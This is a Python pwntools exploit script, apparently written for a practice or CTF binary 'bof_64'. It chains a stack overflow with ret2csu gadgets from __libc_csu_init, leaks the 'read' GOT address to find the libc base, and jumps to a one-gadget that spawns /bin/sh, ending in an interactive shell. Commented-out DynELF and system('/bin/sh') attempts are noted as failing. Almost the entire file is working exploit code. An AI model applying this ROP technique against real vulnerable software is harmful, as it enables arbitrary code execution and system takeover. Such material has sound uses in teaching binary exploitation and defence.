# coding:utf-8
# 使用__libc_csu_init中的gadget
# 使用Magic gadget直接启动shell

# 使用DynELF泄漏地址、内存中写入/bin/sh等会导致后面无法启动shell，原因不明。。

from pwn import *

context.log_level='debug'

io = process('./bof_64')
e = ELF('./bof_64')

'''
.text:0000000000400700
.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400700                 mov     rdx, r13
.text:0000000000400703                 mov     rsi, r14
.text:0000000000400706                 mov     edi, r15d
.text:0000000000400709                 call    qword ptr [r12+rbx*8]
.text:000000000040070D                 add     rbx, 1
.text:0000000000400711                 cmp     rbx, rbp
.text:0000000000400714                 jnz     short loc_400700
.text:0000000000400716
.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+36j
.text:0000000000400716                 add     rsp, 8
.text:000000000040071A                 pop     rbx
.text:000000000040071B                 pop     rbp
.text:000000000040071C                 pop     r12
.text:000000000040071E                 pop     r13
.text:0000000000400720                 pop     r14
.text:0000000000400722                 pop     r15
.text:0000000000400724                 retn
.text:0000000000400724 __libc_csu_init endp
'''

def r(func, arg1, arg2, arg3, nextfunc):
	payload = 'A'*24
	payload += p64(0x40071A) 		# pop6ret
	payload += p64(0) 				# rbx = 0 
	payload += p64(1) 				# rbp = 1
	payload += p64(func) 	# r12 function to call
	payload += p64(arg3) 				# r13 = rdx , 3rd arg 
	payload += p64(arg2) 	# r14 = rsi , 2nd arg
	payload += p64(arg1) 				# r15 = edi , 1st arg
	payload += p64(0x400700) 		# mov3call
	payload += 'A'*0x8*7
	payload += p64(nextfunc) # return to main.

	return payload

def leak(addr):
	io.sendline(r(e.got['write'], 1, addr, 8, e.symbols['main']))
	io.recv(4)
	buf = io.recv(8)
	log.info('leak %#x->%s'%(addr, buf))
	return buf


# leak and resolve works fine. but system("/bin/sh") went something wrong.
# why ????

#d = DynELF(leak, elf=e)
#system_addr = d.lookup('system', 'libc')
#log.info('system_addr: %#x' % system_addr )

# use this to write /bin/sh 
# this lead start /bin/sh fail,too
# why ???

#buf = '/bin/sh'
#io.sendline(r(e.got['read'], 0, e.got['__libc_start_main'], 200,e.symbols['main']))
#io.recv(4)
#io.sendline(buf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
read_addr = u64(leak(e.got['read']))
libc_base =  read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

sh_addr = libc_base + next(libc.search('/bin/sh'))

log.info('read: %#x' %read_addr)
log.info('system: %#x' %system_addr)
log.info('bin/sh: %#x' %sh_addr)

magic_sh = libc_base + 0x0000413D4  # this works!!!

'''
.text:00000000000413D4                 mov     rax, cs:environ_ptr_0
.text:00000000000413DB                 lea     rdi, aBinSh     ; "/bin/sh"
.text:00000000000413E2                 lea     rsi, [rsp+188h+var_158]
.text:00000000000413E7                 mov     cs:dword_3A54C0, 0
.text:00000000000413F1                 mov     cs:dword_3A54C4, 0
.text:00000000000413FB                 mov     rdx, [rax]
.text:00000000000413FE                 call    execve
.text:0000000000041403                 mov     edi, 7Fh        ; status
.text:0000000000041408                 call    _exit
'''

pop_edi_ret = 0x00400723  #0x004005f3 

#payload = 'A'*24 + p64(pop_edi_ret) + p64(sh_addr) + p64(system_addr) + p64(e.symbols['main'])
#payload = 'A'*24 + p64(pop_edi_ret) + p64(sh_addr) + p64(system_addr) + p64(e.symbols['main'])
payload = 'A'*24 + p64(magic_sh)

#gdb.attach(io, 'b *0x00400580')

io.sendline(payload)
#io.recv(4)
io.interactive()